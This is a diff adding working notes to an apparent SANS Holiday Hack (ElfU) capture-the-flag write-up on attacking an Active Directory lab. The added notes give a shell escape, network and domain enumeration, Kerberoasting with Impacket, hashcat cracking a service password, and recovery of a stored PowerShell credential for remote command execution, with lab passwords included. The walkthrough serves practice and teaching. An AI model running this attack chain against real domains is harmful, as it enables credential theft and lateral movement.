@@ -25,10 +25,10 @@ ElfU Registration Portal
 New Student Domain Account Creation Successful!  You can now access the student
 network grading system by SSH'ing into this asset using the command below:
 
-ssh lguphvnejd@grades.elfu.org -p 2222
+ssh klgvjptkqc@grades.elfu.org -p 2222
 
-ElfU Domain Username: lguphvnejd
-ElfU Domain Password: Cjeblycko!
+ElfU Domain Username: klgvjptkqc
+ElfU Domain Password: Hrtthvtul@
 ```
 
 ```text
@@ -100,8 +100,144 @@ Eve Snowshoes:
 
 [chris-davis-talk]: https://www.youtube.com/watch?v=iMh8FTzepU4
 [kerberoasting]: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
+
+
+
+
 [onetorulethemall]: https://github.com/NotSoSecure/password_cracking_rules
 [cewl]: https://github.com/digininja/CeWL
 [bloodhound]: https://github.com/BloodHoundAD/BloodHound
 [native]: https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
 [methods]: https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf
+
+Escape the grading system with Ctrl-D,
+then in Python spawn a shell:
+```python
+import pty
+pty.spawn('/bin/bash')
+```
+
+As `nmap` is present, look for a potential DC:
+
+```bash
+$ klgvjptkqc@grades:~$ nmap -p 389 --open 172.17.0.*
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-28 16:31 UTC
+Nmap scan report for 172.17.0.3
+Host is up (0.00046s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+
+$ $ smbclient -L 172.17.0.3
+Enter WORKGROUP\klgvjptkqc's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	netlogon        Disk
+	sysvol          Disk
+	elfu_svc_shr    Disk      elfu_svc_shr
+	research_dep    Disk      research_dep
+	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+SMB1 disabled -- no workgroup available
+
+$ rpcclient -U klgvjptkqc 172.17.0.3
+Enter WORKGROUP\klgvjptkqc's password:
+$> querydominfo
+Domain:		ELFU
+Server:
+Comment:
+Total Users:	505
+Total Groups:	18
+Total Aliases:	33
+
+rpcclient $> getdompwinfo
+min_password_length: 7
+password_properties: 0x00000001
+	DOMAIN_PASSWORD_COMPLEX
+
+$> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44f]
+group:[RemoteManagementDomainUsers] rid:[0x453]
+group:[ResearchDepartment] rid:[0x454]
+group:[File Shares] rid:[0x5e7]
+```
+
+```sh
+$ /usr/local/bin/GetUserSPNs.py -outputfile spns.txt -dc-ip 172.17.0.3 ELFU/klgvjptkqc:'Hrtthvtul@' -request:who
+[-] list index out of range
+
+$ /usr/bin/python3  /usr/local/bin/GetUserSPNs.py -outputfile spns.txt ELFU.local/klgvjptkqc:'Hrtthvtul@' -request
+
+$ /usr/bin/python3  /usr/local/bin/GetUserSPNs.py -outputfile spns.txt ELFU.local/klgvjptkqc:'Hrtthvtul@' -request
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
+-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
+ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 17:01:52.916386
+ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 17:01:52.916386
+ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 17:01:52.916386
+ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-28 17:01:52.916386
+```
+
+docker run -it --rm cewl  --verbose -o https://register.elfu.org > wordlist
+
+```sh
+$ hashcat  -m 13100 spns.txt  -r OneRuleToRuleThemAll.rule  --force -O wordlist.txt --show
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$ELFU.local/elfu_svc*$6aca036b36ec56aba....cd1d1fa62cc310a23f5f654aaa088d4aed59eac66584289b3dd8f971118125d2d2ad1f16b5011cc42909c0972f5d393f75470340ad3555279f3907c66720c8627b8594233b992cb3f8cd1a7cf0be6617ae42932b0a008174f9da160eb6fd94973154ff64f20271d5bba631f987c99ce161ba6e4117877245bc5ac24a69163bc0640b79f322df1c073532fa11992a580cf88a467a39525516792b4201fd7c18d8487f3126c28ebde374817384e82d34253e:Snow2021!
+```
+
+
+smbclient  \\\\SHARE30\\elfu_svc_shr\\ -U elfu_svc
+Enter WORKGROUP\elfu_svc's password:
+Try "help" to get a list of possible commands.
+smb: \> prompt off
+smb: \> mget *
+
+
+$ cat *.ps1 | grep -i password | grep -i secstr
+$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+
+$ grep SecStringPassword *
+GetProcessInfo.ps1:$SecStringPassword = "76492....d111
+GetProcessInfo.ps1:$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+
+```pwsh
+$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADD
+IANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQQ
+A5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
+$aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+$aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
+Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
+```
+
+
+$ pwsh GetProcessInfo.ps1
+
+ NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName                                  PSComputerName
+ ------    -----      -----     ------      --  -- -----------                                  --------------
+      9     4.31      10.10       0.00    3520   0 conhost                                      10.128.1.53
+     21     2.33       5.43       0.00     600   0 csrss                                        10.128.1.53
+
+
+PS /home/klgvjptkqc> ConvertFrom-SecureString $aPass
+41003100640036003500350066003700660035006400390038006200310030002100
+
+
+
+SantaSecretToAWonderfulHolidaySeason.pdf
